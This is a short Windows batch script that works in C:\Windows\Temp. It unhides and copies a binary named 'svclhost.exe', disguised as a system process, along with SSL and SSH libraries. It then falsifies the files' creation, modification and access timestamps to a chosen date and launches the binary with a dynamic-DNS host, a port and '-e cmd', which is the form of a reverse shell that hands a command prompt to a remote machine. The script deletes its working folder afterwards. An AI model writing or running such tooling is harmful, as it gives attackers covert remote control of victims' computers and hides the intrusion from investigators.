@echo off & mode 16,1
cd "C:\Windows\Temp"
mkdir 0test0

attrib -h -s "C:\Windows\Temp\svclhost.exe"
attrib -h -s "C:\Windows\Temp\svclhost.vbs"
attrib -h -s "C:\Windows\Temp\libcrypto-3.dll"
attrib -h -s "C:\Windows\Temp\libssh2.dll"
attrib -h -s "C:\Windows\Temp\libssl-3.dll"

copy /y "C:\Windows\Temp\libcrypto-3.dll" "C:\Windows\Temp\0test0\libcrypto-3.dll"
copy /y "C:\Windows\Temp\libssh2.dll" "C:\Windows\Temp\0test0\libssh2.dll"
copy /y "C:\Windows\Temp\libssl-3.dll" "C:\Windows\Temp\0test0\libssl-3.dll"
copy /y "C:\Windows\Temp\svclhost.exe" "C:\Windows\Temp\0test0\svclhost.exe"
copy /y "C:\Windows\Temp\svclhost.vbs" "C:\Windows\Temp\0test0\svclhost.vbs"
cd "C:\Windows\Temp\0test0"

set "n_date="
set "n_time="
set "n_pt="

set /P n_date=Enter Required Date (MM/DD/YYYY): 
set /P n_time=Enter Required Time (HH:MM:SS): 
if not defined n_date (set n_date=01/16/2022)
if not defined n_time (set n_time=11:24:47)

powershell -Command "Get-ChildItem -force C:\Windows\Temp\0test0 * | ForEach-Object{$_.LastWriteTime = ('%n_date% %n_time%');$_.CreationTime = ('%n_date% %n_time%');$_.LastAccessTime = ('%n_date% %n_time%')}"

xcopy "C:\Windows\Temp\0test0" "C:\Windows\Temp" /h /i /c /k /e /r /y
cd "C:\Windows\Temp"

cmd /c "C:\Windows\Temp\0test0\svclhost.exe" nomancan.zapto.org %n_pt% -e cmd

rmdir /Q /S "C:\Windows\Temp\0test0"
